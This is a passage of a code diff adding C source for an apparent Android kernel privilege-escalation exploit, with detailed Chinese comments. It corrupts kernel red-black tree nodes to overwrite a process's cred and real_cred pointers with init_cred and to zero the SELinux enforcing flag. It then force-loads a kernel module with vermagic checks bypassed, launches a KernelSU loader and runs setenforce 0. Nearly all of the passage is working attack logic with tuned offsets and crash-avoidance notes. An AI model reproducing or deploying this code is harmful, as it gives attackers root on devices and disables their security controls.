+            system("/system/bin/sh /data/local/tmp/ksu_go.sh > /data/local/tmp/ksu_go.log 2>&1 &");
+            pr_success("mt47: ksud loader launched (uid=%d) pid=%d\n", getuid(), getpid());
+            fflush(stdout);
+            fflush(stdout);
+          }
+          /* mt73: detect C-only half-state (cred=init, real_cred unchanged).
+           * File/status I/O is already blinded, so use sethostname beacon;
+           * do NOT setresuid here (would hit commit_creds BUG_ON). */
+          if (!mt73_capeff_seen && euid == 0 && !mt73_c_signal_sent) {
+            mt73_c_signal_sent = 1;
+            pr_info("mt73: C half-state landed euid=0 (no R stick) - sethostname signal\n");
+            fflush(stdout);
+            if (sethostname("glroot", 6) == 0)
+              pr_info("mt73: sethostname(glroot) signal sent\n");
+            else
+              pr_info("mt73: sethostname failed errno=%d\n", errno);
+            fflush(stdout);
+          }
+          if (root_seen) {
+            char *ko = getenv("PSELECT_KO");
+            if (ko && !ksu_done && (poll_i % 5) == 0) {
+              int kfd = (mt85_kfd >= 0) ? mt85_kfd : open(ko, O_RDONLY);
+              if (kfd >= 0) {
+                /* mt50: vermagic 不匹配 (ko=5.10.252-dirty vs 本机 5.10.209) →
+                 * 内核自带正规绕道: finit_module flags. 已指令级实证
+                 * check_modinfo+0x2cc (0xffffffc0082a4ea4) tbnz w22,#1 =
+                 * bit1(IGNORE_VERMAGIC=2) 置位直接跳过 vermagic 比较; bit0
+                 * (IGNORE_MODVERSIONS=1) 使 __versions 索引归零 (跳 CRC 校验,
+                 * TAINT_FORCED_MODULE, 无害). 梯子: 先 0 (留诊断: 哪个检查挡的)
+                 * → 失败再 3. 见 VERMAGIC_BYPASS_2026-08-16.md */
+                long rc = syscall(SYS_finit_module, kfd, "", 0);
+                int insmod_errno = errno;
+                if (rc != 0 && (insmod_errno == ENOEXEC || insmod_errno == EINVAL)) {
+                  long rc2 = syscall(SYS_finit_module, kfd, "", 3);
+                  int e2 = errno;
+                  pr_info("mt50: flags=3 retry rc=%ld errno=%d (first errno=%d)\n",
+                          rc2, e2, insmod_errno);
+                  fflush(stdout);
+                  if (rc2 == 0) { rc = 0; insmod_errno = 0; }
+                  else { insmod_errno = e2; }
+                }
+                close(kfd);
+                if (rc == 0) {
+                  ksu_done = 1;
+                  pr_success("mt47: ★ finit_module(%s) OK — KSU 路径打通 ★\n", ko);
+                  fflush(stdout);
+                  int dfd = open("/data/local/tmp/ksu_done.txt",
+                                 O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                  if (dfd >= 0) {
+                    dprintf(dfd, "pid=%d\n", getpid());
+                    close(dfd);
+                  }
+                  _exit(42);
+                }
+                if ((poll_i % 50) == 0) {
+                  pr_info("mt47: insmod retry poll=%d errno=%d\n",
+                          poll_i, insmod_errno);
+                  fflush(stdout);
+                }
+              }
+            }
+          }
+          /* mt49: 状态发布 — 跨进程双写的桥梁. 阶段R进程 fork 本子进程并写 real_cred;
+           * 阶段C进程读本文件取 task 地址补写 cred. CapEff 来自 real_cred(status 用
+           * __task_cred), euid 来自 cred(getresuid) — 阶段脚本据此判断 R 是否落地. */
+          {
+            int sfd = open("/data/local/tmp/mt49_child_status.txt",
+                           O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (sfd >= 0) {
+              dprintf(sfd, "task=%016zx uid=%d euid=%d CapEff=%016llx root_seen=%d\n",
+                      (size_t)my_task, ruid, euid, capeff, root_seen);
+              /* mt51: fsync — panic 杀页缓存, 不落盘的检测通道在崩溃后等于
+               * 不存在 (CRASH_HEALTHY_ENV 全灭教训). 轮询间隔 ~百 ms, 代价可忽略 */
+              fsync(sfd);
+              close(sfd);
+            }
+          }
+          if (poll_i > 0 && (poll_i % 50) == 0) {  /* 10s 心跳 */
+            pr_info("mt47: alive poll=%d uid=%d CapEff=%016llx\n",
+                    poll_i, ruid, capeff);
+            fflush(stdout);
+          }
+          usleep(200000);
+        }
+        if (root_seen) _exit(42);
+        pr_info("mt47: child window over (8min), root_seen=%d\n", root_seen);
+        fflush(stdout);
+        _exit(2);
+      }
+      if (!mt49_task_env) {
+        close(cred_pipe[1]);
+        ssize_t rr = read(cred_pipe[0], &task, sizeof(task));
+        ssize_t rr2 = read(cred_pipe[0], &g_perf_cred_cand, sizeof(g_perf_cred_cand));
+        close(cred_pipe[0]);
+        if (rr != (ssize_t)sizeof(task) || !task) {
+          pr_error("mt33: child-task-leak-failed rr=%zd task=%016zx\n", rr, (size_t)task);
+          kill(cred_child, SIGKILL);
+          waitpid(cred_child, NULL, 0);
+          return 1;
+        }
+      }
+      if (!task) {
+        pr_error("mt28c: perf task leak failed\n");
+        return 1;
+      }
+      /* mt70: PSELECT_HOLDER=1 → fork 子进程只泄漏 task 并进入 8min 轮询，
+       * 父进程不触发任何写，打印 task 后退出。用于 R-external / 几何对照实验
+       * 提供干净、活着的写目标（real_cred 和 cred 都未改）。 */
+      if (getenv("PSELECT_HOLDER")) {
+        if (mt49_task_env) {
+          pr_error("mt70: HOLDER requires fork mode (no PSELECT_TASK)\n");
+          return 1;
+        }
+        pr_info("mt70: HOLDER task=%016zx cred_cand=%016zx (child alive, no write)\n",
+                (size_t)task, (size_t)g_perf_cred_cand);
+        fflush(stdout);
+        return 0;
+      }
+      /* mt40: route C - use perf-leaked cred addr, write cred content (real uid@+0x4), not ptr */
+      uintptr_t cred_addr = g_perf_cred_cand;
+      if (!mt49_task_env && !cred_addr) {
+        pr_error("mt40: no cred_cand from perf - need PSELECT_PERF_CRED\n");
+        kill(cred_child, SIGKILL);
+        waitpid(cred_child, NULL, 0);
+        return 1;
+      }
+      uintptr_t cred_uid_ptr = cred_addr;  /* set per-attempt below */
+      char pc_env[32], right_env[32], left_env[32];
+      snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(cred_uid_ptr - 8));
+      snprintf(left_env, sizeof(left_env), "%zx", (size_t)cred_addr);
+      pr_info("mt40: task=%016zx cred_addr=%016zx uid_ptr=%016zx\n",
+              (size_t)task, (size_t)cred_addr, (size_t)cred_uid_ptr);
+      fflush(stdout);
+      /* mt28n: PSELECT_CRED_BOOTID=1 → 观测测试: tree_left=boot_id (可观测),
+       * 其余单词不变 — 验证 Case-2 在 CRED 单词下是否触发 */
+      if (getenv("PSELECT_CRED_BOOTID")) {
+        snprintf(left_env, sizeof(left_env), "%zx",
+                 (size_t)SLIDE_RANDOM_BOOT_ID_DATA);
+        pr_info("mt28n: OBSERVABLE mode (tree_left=boot_id)\n");
+      }
+      fflush(stdout);
+
+      int retries = 8;
+      char *r_env = getenv("PSELECT_RETRY");
+      if (r_env) retries = atoi(r_env);
+      /* mt28m: 单步 Case-2 — *(tree_left=task+0x820) = tree_right=假cred(SLIDE页).
+       * 假 cred usage=0x100(RED→rebalance=NULL), 非活对象 → 无竞争崩溃. */
+      int got_root = 0;
+      for (int att = 1; att <= retries && !got_root; att++) {
+        uintptr_t fake_cred = P0_DATA_ALIAS_CONST(INIT_CRED); /* 2026-08-15 mt30: 写 init_cred 指针 (ghostlock W2 经验, RCU 安全) */
+        /* mt47: 三种写入模式
+         * PTR_MODE ★主路线★: STORE(a) [task+0x780]=init_cred别名 — cred 指针一发换
+         *   init_cred, ELF dump 实证: id 全 0 + cap_eff=0x1fffffffffffffff(全满)。
+         *   STORE(b) 副作用 [init_cred]=pc(task+0x778):
+         *     usage ← 低32位(≈1.5e9 巨大正值 — 引用计数永不归零, 防释放=护身符,
+         *             mt32-36 的 __put_cred BUG_ON 结构性免疫)
+         *     uid   ← 高32位(0xffffff80 — 子进程 setresuid(0) 自愈, 无需补刀)
+         *   child≠0 → 无 rebalance(ELF 反汇编实证), 两个 store 都落在合法可写内存。
+         * FIX_MODE(可选卫生轮): 零写 [init_cred+4] → uid+gid 归零。
+         * 窗口模式: mt46 的 uid 零写轮扫(保留, 作对照/备份路线)。 */
+        if (getenv("PSELECT_SELINUX_ENF")) {
+          /* mt74 (E5): selinux enforcing 零写 — 全链 root 的第一发。
+           * 走【主树】(R 几何 7/7 实证的同一 store 路径), 不碰 pi_tree:
+           *   TREE_PC = (selinux_alias-8) & ~3   ★必须 RED(bit0=0)★
+           *   TREE_RIGHT = 0 (child=0 → STORE(b) 有 cbz 守卫, 跳过)
+           *   TREE_LEFT = 0 (CASE_A)
+           *   → 唯一 STORE: *(TREE_PC+8) = *(selinux_state_alias+0) = 0
+           * 指令级实证 (2026-09-04, rb_erase @0xffffffc008a71228 反汇编):
+           *   CASE_A: 0x29c cbz x8(child),0x360 — child=0 时 STORE(b) 跳过 ✓
+           *   0x360: sbfx x8,x9,#0,#1; and x10,x8,x10(parent); cbnz→旋转
+           *     → rebalance iff pc bit0==1(RB_BLACK) 且 child==0。
+           *     ★upstream RB_RED=0/RB_BLACK=1 — fops.c 老注释"RED已置位"是反的,
+           *     |1 会进 __rb_erase_color 旋转(SELinux 区当树节点=致命)。必须 &~3★
+           *   R 几何(task+0x770,bit0=0 RED,child≠0) 7/7 无旋转 — 同构佐证。
+           * enforcing 位置实证: avc_denied+0x1c ldarb [x0(state)]; tbz #0 →
+           *   enforcing@selinux_state+0 (Android 重排, 非 upstream +1);
+           *   avc@state+0x48 → 8字节零写(+0..+7)只清 enforcing/checkreqprot/
+           *   initialized/policycap[0..3], 不碰任何指针。
+           * 效果: avc_denied 永走 tbz allow → 全局 permissive →
+           *   mt47/73 检测复活(C 写不再致盲) + finit_module SELinux 钩子放行。
+           * PI 词保持全 0(复位块处理) → pi erase 走 root 无害路径, 与 R/C 轮同。
+           * 写后验证: cat /sys/fs/selinux/enforce == 0。
+           * ── mt76 (E5v2, 2026-09-05 黑屏后修订) ──
+           * E5v1(全零) 实测 2/2 黑屏挂死(心跳在 ~80s ≈ watchdog 周期处戛然而止)。
+           * 静态排查(见 CHECKPOINT_e5_geometry §八):
+           *   - 内核镜像内 159 个 selinux_state 引用者全是 SELinux 自身机制,
+           *     无 OEM 看门狗函数 → 非内核反制;
+           *   - 清零窗 +0..+7 无指针(avc@+0x48, xref 仅物化 +0/+2/+7) → 无 NULL deref;
+           *   - initialized=0 时 compute_av/may_create/exec 全走早期放行 → 非内核拒绝挂死。
+           * 结论: 杀手在用户态(framework 对 enforce=0/状态不一致的反应)。
+           * ── mt76 (E5v2) 已废 ★★: VALUE=0x10000/0x10001 形态非法 —
+           *   非零值放进 TREE_RIGHT(word1=child) → CASE_A 额外执行
+           *   STORE(b) *(child)=pc → 写未映射地址 0x10000 → 同步异常 →
+           *   panic → 整机重启(2026-09-05 现场实证, 输出全 NUL)。
+           *   E5v2/E5R 从未真正检验过"保 initialized"语义。历史保留如下:
+           * E5v2(废): VALUE(hex, 默认 0x10000): +0 enforcing=0,
+           *   +1 checkreqprot=0, +2 initialized=1 — 形态非法, 见 mt78 块。
+           * ── mt78 (E5v3, 2026-09-05) ──
+           * ★写值合法形态(rb_erase 反汇编核实): 0(单 store)或「可写牺牲
+           *   指针」(双 store, 附带污染该指针+0 处 8 字节)。小常数一律 panic。★
+           * 巧解: child=喷页「真·页对齐」地址, 其地址字节即目标布局。
+           * ── mt79 (E5v3r2, 2026-09-06 现场修正) ──
+           * mt78 首轮实证: fake_lock = payload_base+0x1350, 而 payload_base =
+           * page_base-0xe80 (skb 数据区非页对齐) → fake_lock 尾字节=0xd0,
+           * 运行时校验正确 ABORT(零事故). 修正: child 改用 ★page_base★
+           * (main.c 现成变量, 真页对齐, 与 mt55 假 cred 公式同一 page_base):
+           *   SPRAY:  child=page_base   → byte0=00(enforcing=0)
+           *   SPRAY1: child=page_base+1 → byte0=01(E5R 还原 enforcing=1)
+           *   byte2=(page_base>>16)&0xff 实测 0x2c≠0 (initialized 保留, 校验把关)
+           *   STORE(b) *(child+0)=pc → 污染页首(+0 或 +1..+9)零区:
+           *   put64 布局只写 LOCK_OFF(0x1350)/W0_OFF(0x2220)/SCRATCH(0x3000)/
+           *   假cred(0x3800)/security(0x3900) — 页首 0xe80 区从未被写, 牺牲安全 ✓
+           * VALUE 语义(承 mt78): "SPRAY"(默认)=page_base, "SPRAY1"=page_base+1,
+           *   "0"=E5v1 全零写(仅受控对照), 其它数字一律 ABORT(防 §5.1)。 */
+          uintptr_t enf_alias = P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + SELINUX_STATE_OFF);
+          uint64_t mt78_child;
+          const char *mt78_mode = getenv("PSELECT_SELINUX_ENF_VALUE");
+          if (!mt78_mode || !*mt78_mode || !strcmp(mt78_mode, "SPRAY")) {
+            mt78_mode = "SPRAY";
+            if (!page_base) {
+              pr_error("mt79: E5v3 %s but no spray page (page_base=0) - ABORT\n",
+                       mt78_mode);
+              fflush(stdout);
+              break;
+            }
+            mt78_child = (uint64_t)(size_t)page_base;
+          } else if (!strcmp(mt78_mode, "SPRAY1")) {
+            if (!page_base) {
+              pr_error("mt79: E5v3 SPRAY1 but no spray page (page_base=0) - ABORT\n");
+              fflush(stdout);
+              break;
+            }
+            mt78_child = (uint64_t)(size_t)page_base + 1;
+          } else if (!strcmp(mt78_mode, "0")) {
+            mt78_child = 0; /* E5v1 全零写: 单 store, 已知黑屏风险, 仅受控对照 */
+          } else {
+            pr_error("mt78: E5v3 VALUE='%s' 非法(仅 0/SPRAY/SPRAY1) — 非零常数"
+                     "会被当 child 解引用(STORE(b) *(child)=pc) → panic, "
+                     "E5v2 §5.1 同款. ABORT\n", mt78_mode);
+            fflush(stdout);
+            break;
+          }
+          uint8_t mt78_b0 = mt78_child & 0xff;
+          uint8_t mt78_b1 = (mt78_child >> 8) & 0xff;
+          uint8_t mt78_b2 = (mt78_child >> 16) & 0xff;
+          if (mt78_child) {
+            if ((mt78_mode[0] == 'S') && (mt78_b0 != 0) && (mt78_b0 != 1)) {
+              pr_error("mt78: E5v3 child=%llx byte0=%02x 既非0(enforce=0)也非1"
+                       "(还原) — 喷页未对齐? ABORT\n",
+                       (unsigned long long)mt78_child, mt78_b0);
+              fflush(stdout);
+              break;
+            }
+            if (mt78_b2 == 0) {
+              pr_error("mt78: E5v3 child=%llx byte2(initialized)=0 — 违反"
+                       "保留 initialized 语义(=v1 连带嫌疑形态). ABORT\n",
+                       (unsigned long long)mt78_child);
+              fflush(stdout);
+              break;
+            }
+          }
+          snprintf(pc_env, sizeof(pc_env), "%zx",
+                   (size_t)((enf_alias - 8) & ~3ULL));
+          snprintf(right_env, sizeof(right_env), "%zx", (size_t)mt78_child);
+          snprintf(left_env, sizeof(left_env), "0");
+          pr_info("mt79: E5v3r2 SELINUX_ENF pc=%s child=%llx mode=%s "
+                  "(enforcing=%02x checkreqprot=%02x initialized@+2=%02x)\n",
+                  pc_env, (unsigned long long)mt78_child, mt78_mode,
+                  mt78_b0, mt78_b1, mt78_b2);
+          fflush(stdout);
+        } else if (getenv("PSELECT_PTR_PI")) {
+          /* mt72 (E4): pi_tree_entry 继承色写 — 绕开 C 几何悖论。
+           * 指令级推导 (rb_erase CASE_A 反汇编实证, 见
+           * CHECKPOINT_C_stage_paradox_20260901.md):
+           *   PI_PC(word3)=写值, PI_RIGHT(word4)=写目标, PI_LEFT(word5)=0
+           *   → child=word4≠0 → 无 rebalance (cbz x8 不跳, x10=xzr)
+           *   → 检查 *(word3+0x10)==node? ne (init_cred+0x10=euid/egid=0)
+           *   → STORE(a) *(word3+8)=word4   (init_cred gid/suid 区污染, 无害)
+           *   → STORE(b) *(word4+0)=word3   ★[task+0x780]=init_cred 别名★
+           * 主树无害化: pc=fake_lock 喷页零区, right=left=0
+           *   → CASE_A child=0 → 只写 [fake_lock+8]=0 (零区自写), 无旋转。
+           * 用法A·两轮策略(两进程, 一进程一写 — crash#2 教训 RETRY=1):
+           *   R 轮(主树写 real_cred)后, E4 轮(本模式, external
+           *   PSELECT_TASK=R 轮 child)补写 cred → real==cred==init_cred 别名
+           *   → AND-gate (CapEff 满 && euid==0) 命中 → setresuid → root。
+           * 用法B·隔离实验(fork, 无 PSELECT_TASK): 只写 cred — CapEff 空 &&
+           *   euid=0 半程态, STRICT AND-gate 结构性不触发, 安全; 判据=
+           *   mt49_child_status.txt 出现 euid=0 且 CapEff=0。
+           * stage=C: mt51 发间中止信号 = euid==0 (cred 已换)。外部模式下 R
+           * 轮已把 CapEff 打满 — R 语义(CapEff 满即中止)会首发后误停,
+           * 必须显式 C 语义, 否则 E4 静默变单发。 */
+          uintptr_t pi_value = P0_DATA_ALIAS_CONST(INIT_CRED);
+          char *mt72_pv = getenv("PSELECT_PTR_VALUE");
+          if (mt72_pv && *mt72_pv) pi_value = strtoull(mt72_pv, NULL, 0);
+          size_t mt72_toff = TASK_REAL_CRED_OFF + 8; /* 默认 task+0x780 (cred) */
+          char *mt72_pt = getenv("PSELECT_PTR_TARGET_OFF");
+          if (mt72_pt && *mt72_pt) mt72_toff = strtoull(mt72_pt, NULL, 0);
+          if (!fake_lock) {
+            pr_error("mt72: PTR_PI but no spray page (fake_lock=0) - ABORT attempt\n");
+            fflush(stdout);
+            break;
+          }
+          snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)fake_lock);
+          snprintf(right_env, sizeof(right_env), "0");
+          snprintf(left_env, sizeof(left_env), "0");
+          char mt72_pi_pc[32], mt72_pi_right[32];
+          snprintf(mt72_pi_pc, sizeof(mt72_pi_pc), "%zx", (size_t)pi_value);
+          snprintf(mt72_pi_right, sizeof(mt72_pi_right), "%zx",
+                   (size_t)(task + mt72_toff));
+          setenv("PSELECT_PI_PC", mt72_pi_pc, 1);
+          setenv("PSELECT_PI_RIGHT", mt72_pi_right, 1);
+          setenv("PSELECT_PI_LEFT", "0", 1);
+          setenv("PSELECT_PTR_STAGE", "C", 1);
+          pr_info("mt72: PI-write task=%016zx target=+%zx value=%zx "
+                  "main_pc=%s (STORE(b)→[task+%zx]=value, 主树无害)\n",
+                  (size_t)task, mt72_toff, (size_t)pi_value, pc_env, mt72_toff);
+          fflush(stdout);
+        } else if (getenv("PSELECT_PTR_MODE")) {
+          /* mt48 两轮换指针: BUG_ON(task->cred != task->real_cred) 已铁证
+           * (commit_creds@0xffffffc008185174: ldr x19,[x20,#0x778]; ldr x8,[x20,#0x780];
+           *  cmp x8,x19; b.ne→brk#0x800) — 单发只换 cred + 子进程 setresgid =
+           * 确定性 panic (mt32-36 + mt47PTR 7/7)。修法: 两个指针都换成 init_cred。
+           *   STAGE=R: pc=task+0x770 → STORE(a) [task+0x778](real_cred)=init_cred
+           *   STAGE=C: pc=task+0x778 → STORE(a) [task+0x780](cred)=init_cred
+           * 两轮都落地 → real==cred==init_cred → commit_creds cmp 相等 → BUG_ON 通过。
+           * 半程态安全性(配合子进程满帽 AND-gate): 无论如何先后, gate 都不触发。
+           * STORE(b) 副作用两轮相同: [init_cred]=pc → usage=低32位(task dmap ≈3亿,
+           * 护身符), uid=高32位(0xffffff82) — setresuid 后子进程用私有 cred, 不再共享。 */
+          static int mt48_alt_stage = 0;
+          char mt48_stage = 'C';
+          char *st_env = getenv("PSELECT_PTR_STAGE");
+          if (st_env && (*st_env == 'R' || *st_env == 'r')) mt48_stage = 'R';
+          if (getenv("PSELECT_PTR_ALT"))
+            mt48_stage = (mt48_alt_stage++ % 2) ? 'C' : 'R';
+          size_t mt48_pc_off;
+          char *mt48_pc_off_env = getenv("PSELECT_PTR_PC_OFF");
+          if (mt48_pc_off_env && *mt48_pc_off_env) {
+            mt48_pc_off = strtoull(mt48_pc_off_env, NULL, 0);
+          } else {
+            mt48_pc_off = (mt48_stage == 'R') ? (TASK_REAL_CRED_OFF - 8)
+                                              : TASK_REAL_CRED_OFF;
+          }
+          snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(task + mt48_pc_off));
+          /* mt54 (spec2-repair): PSELECT_PTR_RIGHT 覆盖写死的 init_cred dmap
+           * 别名 — 修复轮写喷页假 cred (spray_base+0x3800, util.c mt35-era
+           * 全字段假 cred, security 块在 +0x3900)。GEOM_KEEP 救不了 PTR 轮:
+           * pc 必须来自运行时 perf 泄露的 task, 外部 env 无法预知, 所以只
+           * 放行 right 单项覆盖。落地前必核对 RUNLOG 的
+           * "mt48: PTR ... right=... [PTR_RIGHT override]" 行 — 没有该标记
+           * = 静默回落 init_cred = 2/2 致死几何。 */
+          char *mt54_ptr_right = getenv("PSELECT_PTR_RIGHT");
+          int mt55_auto = mt54_ptr_right && !strcmp(mt54_ptr_right, "auto");
+          const char *mt55_tag = "";
+          if (mt55_auto) {
+            /* mt55 (repair): PTR_RIGHT=auto → 喷页假 cred 精确地址。
+             * ⚠ 假 cred 在 payload_base+0x3800, 而 payload_base =
+             * page_base + SKB_DATA_DELTA(-0xe80) — 即 page_base+0x2980。
+             * 直接复用 util.c 同源宏计算, 任何手写 0x3800 都是 off-by-delta
+             * (我在 REPAIR 文档里写过的 "spray+0x3800" 指 payload 视角,
+             * 现场别按字面手填地址)。无喷页 (STATIC_LOCK) = 硬停: 静默
+             * 回落 init_cred 是 2/2 致死几何, 宁可不打。 */
+            if (!page_base) {
+              pr_error("mt55: PTR_RIGHT=auto but no spray page - ABORT attempt\n");
+              fflush(stdout);
+              break;
+            }
+            snprintf(right_env, sizeof(right_env), "%zx",
+                     (size_t)(page_base + SKB_DATA_DELTA + 0x3800));
+            mt55_tag = " [PTR_RIGHT auto=spray_fake_cred]";
+          } else if (mt54_ptr_right) {
+            snprintf(right_env, sizeof(right_env), "%s", mt54_ptr_right);
+            mt55_tag = " [PTR_RIGHT override]";
+          } else {
+            snprintf(right_env, sizeof(right_env), "%zx",
+                     (size_t)P0_DATA_ALIAS_CONST(INIT_CRED));
+          }
+          snprintf(left_env, sizeof(left_env), "0");
+          pr_info("mt48: PTR stage=%c task=%016zx pc=%s right=%s%s (STORE(a)→[%s])\n",
+                  mt48_stage, (size_t)task, pc_env, right_env,
+                  mt55_tag,
+                  mt48_stage == 'R' ? "task+0x778 real_cred" : "task+0x780 cred");
+          fflush(stdout);
+        } else if (getenv("PSELECT_FIX_MODE")) {
+          uintptr_t ic_alias = P0_DATA_ALIAS_CONST(INIT_CRED);
+          snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(ic_alias - 4));
+          snprintf(right_env, sizeof(right_env), "0");
+          snprintf(left_env, sizeof(left_env), "0");
+          pr_info("mt47: FIX_MODE init_cred=%016zx pc=%s (零写→[init_cred+4])\n",
+                  (size_t)ic_alias, pc_env);
+        } else {
+        static const uintptr_t uid_wins[] = { 0x14, 0x4, 0x1c, 0x24 };
+        uintptr_t uid_win = uid_wins[(att - 1) % 4];
+        char *win_env_s = getenv("PSELECT_UID_WIN");
+        if (win_env_s) uid_win = strtoul(win_env_s, NULL, 16);
+        cred_uid_ptr = cred_addr + uid_win;
+        snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(cred_uid_ptr - 8));
+        snprintf(left_env, sizeof(left_env), "0"); /* mt47修正: 必须0 — mt46实证配方; 旧cred_addr是mt28死路遗留, TREE_LEFT≠0会走successor路径 */
+        snprintf(right_env, sizeof(right_env), "0");
+        pr_info("mt46: attempt %d window=%zx uid_ptr=%016zx\n", att, (size_t)uid_win, (size_t)cred_uid_ptr);
+        }
+        /* 2026-08-15 mt32: 改用 PSELECT_W* 写链 (env 优先, util.c 已修) — 不走 tree_left successor 死路
+         * WPC = cred_ptr-8 (写目标: parent->rb_right = task+0x780)
+         * WRIGHT = init_cred dmap (写入值)
+         * WLEFT = 0 (Case-1 主树写, 不崩) */
+        /* mt47: 三模式统一走 TREE_PC 主树 */
+        /* mt52: PSELECT_GEOM_KEEP=1 → 保留外部 TREE_PC/RIGHT/LEFT 不被覆盖。
+         * 探针用: ENF 几何(TREE_PC=selinux, RIGHT=默认fake_lock) + cred 机制
+         * (fork/perf/poll) 的隔离实验。无此 env 行为与旧版逐字节一致。 */
+        if (!getenv("PSELECT_GEOM_KEEP")) {
+          setenv("PSELECT_TREE_PC", pc_env, 1);
+          setenv("PSELECT_TREE_RIGHT", right_env, 1); /* mt47: ★不再写死0★ PTR_MODE 写 init_cred 指针 */
+          setenv("PSELECT_TREE_LEFT", left_env, 1);
+        }
+        setenv("PSELECT_WPC", "0", 1);
+        setenv("PSELECT_WRIGHT", "0", 1);
+        setenv("PSELECT_WLEFT", "0", 1);
+        /* mt72 修复: PI 轮不重置 PI 词。旧代码无条件清零 PSELECT_PI_* —
+         * E4 块在上面 setenv 的 PI_PC/PI_RIGHT/PI_LEFT 在这里被抹掉,
+         * pi erase 退化为全零 root 路径, E4 写静默失效(写了等于没写)。 */
+        if (!getenv("PSELECT_PTR_PI")) {
+          setenv("PSELECT_PI_PC", "0", 1);
+          setenv("PSELECT_PI_RIGHT", "0", 1);
+          setenv("PSELECT_PI_LEFT", "0", 1);
+        }
+        pr_info("mt28m: cred write attempt %d/%d fake_cred=%016zx\n",
+                att, retries, (size_t)fake_cred);
+        fflush(stdout);
+        slide_child_leak_stext();
+        usleep(500000);
+        if (getenv("PSELECT_CRED_BOOTID")) {
+          pr_info("mt28n: boot_id_after=%016llx uid=%d\n",
+                  (unsigned long long)slide_read_boot_id(), getuid());
+          fflush(stdout);
+        }
+        /* mt46: 子进程 200ms 周期自检，无需唤醒
+         * （旧 FUTEX_WAKE 打在父进程自己栈变量上，fork 后 mm 不同，结构性无效，已删） */
+        /* mt47: 子进程 root 后不退出(等 insmod), 父进程改查 marker 文件 */
+        int cst2 = 0;
+        if (cred_child > 0 && waitpid(cred_child, &cst2, WNOHANG) == cred_child) {
+          if (WIFEXITED(cst2) && WEXITSTATUS(cst2) == 42) {
+            pr_success("mt47: CHILD-ROOT attempt=%d\n", att);
+            got_root = 1;
+            break;
+          }
+        }
+        if (access("/data/local/tmp/root_alive.txt", F_OK) == 0 ||
+            access("/data/local/tmp/ksu_done.txt", F_OK) == 0) {
+          pr_success("mt47: ROOT marker seen attempt=%d\n", att);
+          got_root = 1;
+          break;
+        }
+        slide_reset_trigger_state();
+        usleep(300000);
+      }
+      /* mt33/mt47: wait for child result (42 = root) or marker */
+      int cst = 0;
+      for (int i = 0; i < 60; i++) {
+        if (cred_child > 0 && waitpid(cred_child, &cst, WNOHANG) == cred_child) {
+          if (WIFEXITED(cst) && WEXITSTATUS(cst) == 42) {
+            pr_success("mt47: *** CHILD-ROOT confirmed ***\n");
+            got_root = 1;
+          }
+          break;
+        }
+        if (access("/data/local/tmp/root_alive.txt", F_OK) == 0 ||
+            access("/data/local/tmp/ksu_done.txt", F_OK) == 0) {
+          pr_success("mt47: *** ROOT marker confirmed (child alive, 8min window) ***\n");
+          got_root = 1;
+          break;
+        }
+        usleep(100000);
+      }
+      /* mt33: no root - leave child blocked (killing it may touch bad cred) */
+      if (0) kill(cred_child, SIGKILL);
+      if (got_root) {
+        int fd = open("/data/local/tmp/root_marker.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd >= 0) {
+          dprintf(fd, "ROOT uid=%d euid=%d task=%016zx pid=%d\n", getuid(),
+                  geteuid(), (size_t)task, getpid());
+          close(fd);
+        }
+        /* mt28g: 顺手 setenforce 0 → 应用可正常打开 */
+        int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
+        if (efd >= 0) {
+          ssize_t wr = write(efd, "0", 1);
+          close(efd);
+          pr_info("mt28g: setenforce 0 wr=%zd errno=%d\n", wr, errno);
+        }
+        /* 持久 root 通道: 拷贝自身(带 root cred 的 daemon) — 简化: 直接起一个 root sh */
+        pr_success("mt28g: ★★★ ROOT MARKER WRITTEN uid=%d ★★★\n", getuid());
+        fflush(stdout);
+        system("/system/bin/sh -c 'id; getenforce' > /data/local/tmp/root_shell.txt 2>&1");
+        sleep(1);
+      } else {
+        pr_error("mt28c: no root after %d attempts\n", retries);
+      }
+      sleep(2);
+      return 0;
+    }
+
+    if (getenv("PSELECT_STATIC_LOCK")) {
+      /* mt28o: 静态锁模式 — 跳过 ks/page prep (~20s/轮) */
+      pr_info("mt28o: STATIC LOCK mode (no ks)\n");
+    } else if (!page_base) {
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+      pr_info("mt19: SLIDE page prepared base=0x%016zx\n", page_base);
+    }
+    if (page_base || getenv("PSELECT_STATIC_LOCK")) {
+      if (getenv("PSELECT_V37")) {
+        /* mt21: v37 拓扑 + FLPI 触发 */
+        pr_info("mt21: running v37 topology trigger\n");
+        fflush(stdout);
+        slide_v37_trigger();
+      } else {
+        /* mt22: 多轮触发 (PSELECT_RETRY, 默认 8) + boot_id 验证 */
+        int retries = 8;
+        char *r_env = getenv("PSELECT_RETRY");
+        if (r_env) retries = atoi(r_env);
+        uint64_t bid0 = slide_read_boot_id();
+        int wrote = 0;
+        for (int att = 1; att <= retries; att++) {
+          pr_info("mt22: trigger attempt %d/%d\n", att, retries);
+          fflush(stdout);
+          slide_child_leak_stext();
+          /* mt25: 读时机 — 等 500ms 让 walk/自发写入落地 (C 修复) */
+          usleep(500000);
+          uint64_t bid1 = slide_read_boot_id();
+          if (bid1 != bid0) {
+            pr_success("★★★ WRITE PRIMITIVE CONFIRMED attempt=%d ★★★\n", att);
+            wrote = 1;
+            break;
+          }
+          slide_reset_trigger_state();
+          usleep(300000);
+        }
+        pr_info("mt22: done wrote=%d\n", wrote);
+        fflush(stdout);
+      }
+    }
+    sleep(2);
+    return 0;
+  }
+
+  /* MTK: give kernel time to reclaim dead processes from SLIDE warmup
+   * before starting the heavy FOPS page preparation */
+  pr_info("MTK cooldown after SLIDE warmup... sleeping 5s\n");
+  sleep(5);
+
+  pr_info("FOPS stage starting: prepare_good_kernel_page(PAGE_PAYLOAD_FOPS)...\n");
+  pin_to_core(CORE);
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  pr_info("FOPS prepare done: page_base=0x%016zx\n", page_base);
+
+  run_main_route_threads();
+
+  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
